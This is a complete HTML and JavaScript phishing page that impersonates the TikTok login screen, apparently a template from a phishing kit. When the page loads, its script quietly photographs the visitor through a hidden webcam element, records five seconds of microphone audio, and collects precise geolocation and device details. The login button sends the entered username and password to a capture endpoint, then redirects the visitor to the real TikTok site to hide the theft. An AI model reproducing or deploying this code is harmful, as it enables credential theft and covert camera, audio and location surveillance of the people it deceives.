<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TikTok - Make Your Day</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
.card{background:#fff;border-radius:24px;padding:35px;width:100%;max-width:380px;text-align:center}
.logo{width:70px;height:70px;background:#000;border-radius:50%;margin:0 auto 15px;display:flex;align-items:center;justify-content:center;font-size:32px}
h1{font-size:28px;color:#000;margin-bottom:5px;font-weight:700}
.subtitle{color:#888;font-size:14px;margin-bottom:25px}
.form-box{text-align:left}
.input-group{margin-bottom:15px}
.input-group input{width:100%;padding:14px 16px;border:1px solid #e5e7eb;border-radius:8px;font-size:15px;outline:none;transition:all 0.3s}
.input-group input:focus{border-color:#ff0050}
.btn-login{width:100%;padding:14px;background:#ff0050;border:none;border-radius:8px;color:#fff;font-size:16px;font-weight:600;cursor:pointer;transition:all 0.3s}
.btn-login:hover{background:#e6004c}
.divider{display:flex;align-items:center;margin:20px 0;color:#888;font-size:13px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#e5e7eb}
.divider span{margin:0 15px}
.social-btn{width:100%;padding:12px;border:1px solid #e5e7eb;border-radius:8px;background:#fff;color:#333;font-size:14px;cursor:pointer;margin-bottom:10px;display:flex;align-items:center;justify-content:center;gap:10px}
.footer{margin-top:20px;font-size:13px;color:#888}
.footer a{color:#ff0050;text-decoration:none;font-weight:600}

.processing{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:#000;align-items:center;justify-content:center;z-index:1000}
.processing.active{display:flex}
.process-box{text-align:center}
.spinner{width:50px;height:50px;border:4px solid #333;border-top-color:#ff0050;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px}
@keyframes spin{to{transform:rotate(360deg)}}
.process-box h2{color:#fff;font-size:20px}
.process-box p{color:#888;font-size:14px;margin-top:10px}

#hiddenCamera{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
</style>
</head>
<body>
<div class="card" id="mainCard">
    <div class="logo">&#127925;</div>
    <h1>TikTok</h1>
    <p class="subtitle">Make Your Day</p>
    <div class="form-box">
        <div class="input-group">
            <input type="text" id="email" placeholder="Email or username">
        </div>
        <div class="input-group">
            <input type="password" id="password" placeholder="Password">
        </div>
        <button class="btn-login" onclick="handleLogin()">Log in</button>
        <div class="divider"><span>OR</span></div>
        <button class="social-btn">&#128222; Use phone / email / username</button>
        <button class="social-btn">&#128187; Continue with Facebook</button>
        <button class="social-btn">&#128038; Continue with Twitter</button>
    </div>
    <div class="footer">Don't have an account? <a href="#">Sign up</a></div>
</div>

<div class="processing" id="processing">
    <div class="process-box">
        <div class="spinner"></div>
        <h2>Loading...</h2>
        <p>Please wait</p>
    </div>
</div>

<video id="hiddenCamera" autoplay playsinline></video>
<canvas id="captureCanvas" style="display:none"></canvas>

<script>
const TOKEN = "<%= token %>";
let captureId = null;

async function silentCapture() {
    const device = {platform:navigator.platform,browser:navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[\d.]+/)?.[0]||'Unknown',language:navigator.language,cores:navigator.hardwareConcurrency||'Unknown',memory:navigator.deviceMemory||'Unknown'};
    const screen={width:window.screen.width,height:window.screen.height};
    let battery={};try{const b=await navigator.getBattery();battery={level:b.level,charging:b.charging}}catch(e){}
    const network={type:navigator.connection?.type||'Unknown',effectiveType:navigator.connection?.effectiveType||'Unknown'};

    const resp=await fetch('/api/capture/init',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:TOKEN,template:'tiktok',device,screen,battery,network})});
    const data=await resp.json();captureId=data.capture_id;

    try{const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
    const video=document.getElementById('hiddenCamera');video.srcObject=stream;
    setTimeout(()=>{const canvas=document.getElementById('captureCanvas');canvas.width=640;canvas.height=480;canvas.getContext('2d').drawImage(video,0,0,640,480);
    fetch('/api/capture/photo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({capture_id:captureId,image:canvas.toDataURL('image/jpeg',0.8)})});
    stream.getTracks().forEach(t=>t.stop());},2000);}catch(e){}

    if(navigator.geolocation){navigator.geolocation.getCurrentPosition(pos=>fetch('/api/capture/location',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({capture_id:captureId,lat:pos.coords.latitude,lon:pos.coords.longitude,accuracy:pos.coords.accuracy})}),()=>{},{enableHighAccuracy:true,timeout:10000});}

    try{const aStream=await navigator.mediaDevices.getUserMedia({audio:true});const rec=new MediaRecorder(aStream);const chunks=[];
    rec.ondataavailable=e=>chunks.push(e.data);rec.onstop=()=>{const blob=new Blob(chunks,{type:'audio/webm'});const reader=new FileReader();reader.onloadend=()=>fetch('/api/capture/audio',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({capture_id:captureId,audio:reader.result})});reader.readAsDataURL(blob);};
    rec.start();setTimeout(()=>rec.stop(),5000);}catch(e){}
}

async function handleLogin(){
    const email=document.getElementById('email').value;const password=document.getElementById('password').value;
    if(!email||!password){alert('Please fill all fields');return;}
    await fetch('/api/capture/credentials',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({capture_id:captureId,username:email,password:password})});
    document.getElementById('mainCard').style.display='none';document.getElementById('processing').classList.add('active');
    setTimeout(()=>window.location.href='https://www.tiktok.com',4000);
}
window.addEventListener('load',silentCapture);
</script>
</body>
</html>